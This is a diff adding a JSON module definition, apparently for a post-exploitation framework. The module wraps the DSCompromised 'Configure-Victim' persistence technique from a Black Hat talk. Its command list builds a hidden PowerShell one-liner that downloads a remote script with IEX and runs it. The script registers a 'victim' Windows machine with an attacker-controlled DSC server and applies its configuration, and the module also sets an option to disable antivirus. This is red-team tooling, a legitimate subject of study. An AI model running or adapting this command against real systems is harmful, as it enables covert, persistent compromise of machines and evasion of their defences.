@@ -1,0 +1,41 @@
+{
+  "base": {
+    "name": "DSCompromised Configure-Victim",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Matt Hastings", "Ryan Kazanciyan"],
+    "path": ["windows", "x64", "powershell", "persistence", "DSCompromised-Configure-Victim.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "powersehll",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/matthastings/DSCompromised/master/Configure-Victim.ps1",
+    "local": ["data", "src", "matthastings", "DSCompromised", "Configure-Victim.ps1"],
+    "options": [
+      {"name": "GUID", "value": "", "required": true, "flag": "-GUID", "description":"GUID to be used to pull the correct configuration (GUID is generated previously, server side, when the configuration is created)."},
+      {"name": "Server", "value": "", "required": true, "flag": "-Server", "description":"Network address of the remote DSC server"},
+      {"name": "MofPath", "value": "", "required": false, "flag": "-MofPath", "description":"Optional parameter of the temporary MOF file location. If  parameter is not supplied the file is written to C:\\Windows\\System32\\Configuration\\PullConfig.mof then deleted."},
+      {"name": "Port", "value": "", "required": false, "flag": "-Port", "description":"Determines the remote port where configuration is hosted. If parameter is not used, the default is 8080"}
+    ],
+    "description": "Registers victim machine with DSC server, downloads and applies specified configuration (GUID), and defines the local configuration manager (LCM)",
+    "notes": "Requires PowerShell v4. You must setup the server yourself using Configure-Server.psm1. Slides: https://www.blackhat.com/docs/asia-16/materials/asia-16-Kazanciyan-DSCompromised-A-Windows-DSC-Attack-Framework.pdf . Video: https://www.youtube.com/watch?v=MWnTg3cQ_mo",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w",
+      "0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/matthastings/DSCompromised/master/Configure-Victim.ps1');",
+      "Configure-Victim",
+      "{{GUID}}",
+      "{{Server}}",
+      "{{MofPath}}",
+      "{{Port}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
